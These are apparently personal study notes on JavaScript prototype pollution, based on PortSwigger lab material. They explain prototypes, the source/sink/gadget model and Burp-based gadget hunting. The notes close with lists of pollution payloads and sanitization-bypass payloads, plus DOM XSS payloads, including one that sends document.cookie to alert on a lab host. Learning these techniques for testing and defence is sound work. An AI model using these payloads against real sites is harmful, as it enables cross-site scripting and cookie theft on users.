### Prototype Pollution
  - https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance
  - Objects in js is key value pair
  - ```
    const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}```
   - Every object is linked to another object, and that object is linked to another object, untill null.
   - Ex: in JS, String are autoassign `String.prototype`. This becomes helpful, because a lot of methods like `Trim()` are in that prototype so string object can use them directly.
   - JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead.
   - Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers
   - We can modify prototypes ```String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}```
  - https://portswigger.net/web-security/prototype-pollution
  -  Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
  -  Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way. This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.
```
b = {"foo":"bar"}
a = b


console.log("Before assigning to a look at b proto",b.__proto__)
a.__proto__={"hidden_foo":"hidden_bar"}
console.log("a has hidden proto",a.__proto__);
console.log("Due to unsafe merging b also has it",b.__proto__)
```
  -  Successful exploitation of prototype pollution requires the following key components:
    - A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties. Commonly, URL, JSON input, web messages
    - A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
    - An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.
 - Client Side:
   1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
    ```vulnerable-website.com/?__proto__[foo]=bar```
   2. In your browser console, inspect Object.prototype to see if you have successfully polluted it with your arbitrary property:
   ```
   	Object.prototype.foo
	// "bar" indicates that you have successfully polluted the prototype
	// undefined indicates that the attack was not successful
   ```
   3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
	```vulnerable-website.com/?__proto__.foo=bar```
   4. Repeat this process for each potential source.
   5. In BURP, we can use DOM invader https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution
   6. Now Find gadget
   7. Look through the source code and identify any properties that are used by the application or any libraries that it imports.
   8. In Burp, enable response interception (Proxy > Options > Intercept server responses) and intercept the response containing the JavaScript that you want to test.
   9. Add a debugger statement at the start of the script, then forward any remaining requests and responses.
   10. In Burp's browser, go to the page on which the target script is loaded. The debugger statement pauses execution of the script.
   11. While the script is still paused, switch to the console and enter the following command, replacing YOUR-PROPERTY with one of the properties that you think is a potential gadget:
   12. Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
    13. The property is added to the global Object.prototype, and the browser will log a stack trace to the console whenever it is accessed.
    14. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
    15. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
    16. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval().
    17. Repeat this process for any properties that you think are potential gadgets.
  - https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/prototype-pollution
  - DOM invador is the way to go, makes life much easier, note: sometimes extra chars like `1` is being appended like this`if(manager && manager.sequence){ manager.macro(ar2z0fxj6prototypepollutionsequencear2z0fxj1) }` so add `-` in the end to ignore the 1.

### Via the constructor
	- sometimes the `__proto__` accessor is blocked, we maybe able to use `constructor` property.
### quick check
https-//example.com/?__proto__[foo]=bar
https-//example.com/?__proto__.foo=bar
https-//example.com/?constructor.[prototype][foo]=bar
https-//example.com/?constructor.prototype.foo=bar
# Bypass sanitization
https-//example.com/?__pro__proto__to__[foo]=bar`

https-//example.com/?__pro__proto__to__.foo=bar

https-//example.com/?constconstructorructor[prototype][foo]=bar

https-//example.com/?constconstructorructor.prototype.foo=bar

https-//example.com/?constconstructorructor[protoprototypetype][foo]=bar

https-//example.com/?constconstructorructor.protoprototypetype.foo=bar


Check in browser
Object.prototype.foo
constructor.prototype.foo

// the expected output: "bar"

# DOM XSS
https-//example.com/?__proto__[source_url]=data:,alert(1);

https-//example.com/?__proto__[source_url]=data:,alert(1);

https-//example.com/?__proto__[source_url]=alert(1)-

source_url can be [transport_url]

# vulnerable 3rd party library
<script>
    location="https://0a1c00af03786a9a80204452004a00a7.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
Here 0a1c00af03786a9a80204452004a00a7.web-security-academy.ne is vulnerable
